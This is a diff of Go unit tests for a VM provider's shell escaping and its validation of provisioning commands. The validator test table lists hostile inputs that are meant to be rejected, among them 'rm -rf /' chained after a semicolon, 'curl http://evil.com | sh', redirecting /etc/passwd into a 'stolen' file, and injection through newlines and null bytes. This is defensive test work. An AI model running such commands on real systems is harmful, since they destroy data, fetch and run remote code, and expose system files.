@@ -287,12 +287,42 @@ func TestLimaProviderExecAsUserArgPreservation(t *testing.T) {
 		t.Errorf("expected 'airlock' user in command, got: %s", recordedCmd)
 	}
 
-	if !strings.Contains(recordedCmd, "hello world") {
-		t.Errorf("each argument should be individually escaped, expected 'hello world' in: %s", recordedCmd)
+	parts := strings.Fields(recordedCmd)
+	hasAirlock := false
+	for _, p := range parts {
+		if p == "airlock" {
+			hasAirlock = true
+		}
+	}
+	if !hasAirlock {
+		t.Errorf("expected 'airlock' as a separate token, got: %q", recordedCmd)
+	}
+
+	if !strings.Contains(recordedCmd, "'hello world'") {
+		t.Errorf("argument with spaces must be single-quoted to preserve boundaries, got: %s", recordedCmd)
 	}
 
 	if !strings.Contains(recordedCmd, "arg3") {
 		t.Errorf("expected 'arg3' in command, got: %s", recordedCmd)
+	}
+}
+
+func TestShellEscapeWrapsInQuotes(t *testing.T) {
+	tests := []struct {
+		input    string
+		expected string
+	}{
+		{"hello", "'hello'"},
+		{"hello world", "'hello world'"},
+		{"it's", "'it'\\''s'"},
+		{"", "''"},
+	}
+
+	for _, tt := range tests {
+		got := shellEscape(tt.input)
+		if got != tt.expected {
+			t.Errorf("shellEscape(%q) = %q, want %q", tt.input, got, tt.expected)
+		}
 	}
 }
 
@@ -382,24 +412,6 @@ func TestLimaProviderCopyToVM(t *testing.T) {
 	}
 }
 
-func TestShellEscape(t *testing.T) {
-	tests := []struct {
-		input    string
-		expected string
-	}{
-		{"hello", "hello"},
-		{"it's", "it'\\''s"},
-		{"", ""},
-	}
-
-	for _, tt := range tests {
-		got := shellEscape(tt.input)
-		if got != tt.expected {
-			t.Errorf("shellEscape(%q) = %q, want %q", tt.input, got, tt.expected)
-		}
-	}
-}
-
 func TestIsSensitiveMountPath(t *testing.T) {
 	tests := []struct {
 		path        string
@@ -452,20 +464,37 @@ func TestGenerateConfigValidationSensitiveMountPath(t *testing.T) {
 	}
 }
 
-func TestGenerateConfigValidationDangerousProvisionCmd(t *testing.T) {
+func TestGenerateConfigValidationProvisionCmdWhitelist(t *testing.T) {
 	tests := []struct {
 		name    string
 		cmd     string
 		wantErr bool
 	}{
 		{"safe command", "apt-get update", false},
-		{"safe install", "apt-get install -y curl", false},
+		{"safe install with flags", "apt-get install -y curl", false},
+		{"safe path with equals", "npm config set prefix /home/user/.npm-global", false},
+		{"safe curl download", "curl -fsSL https://example.com/install.sh", false},
+		{"safe with hash comment", "echo hello # this is a comment", false},
+		{"safe with at sign", "user@host", false},
+		{"safe with plus", "npm install pkg@1.0.0", false},
+		{"safe with comma", "echo a,b,c", false},
+		{"safe with tilde", "cd ~/project", false},
 		{"semicolon injection", "apt-get update; rm -rf /", true},
 		{"pipe injection", "curl http://evil.com | sh", true},
 		{"dollar injection", "echo $HOME", true},
 		{"backtick injection", "echo `whoami`", true},
 		{"ampersand injection", "echo foo && echo bar", true},
 		{"exclamation mark", "echo hello!", true},
+		{"newline with semicolon", "apt-get update\n; rm -rf /", true},
+		{"carriage return", "apt-get update\rrm -rf /", true},
+		{"parentheses", "(kill -9 1)", true},
+		{"redirect output", "cat /etc/passwd > /tmp/stolen", true},
+		{"redirect input", "bash < /tmp/script", true},
+		{"backslash", `echo \n`, true},
+		{"single quote", "echo 'hello'", true},
+		{"double quote", `echo "hello"`, true},
+		{"curly braces", "echo ${HOME}", true},
+		{"null byte", "echo\x00hello", true},
 	}
 
 	for _, tt := range tests {
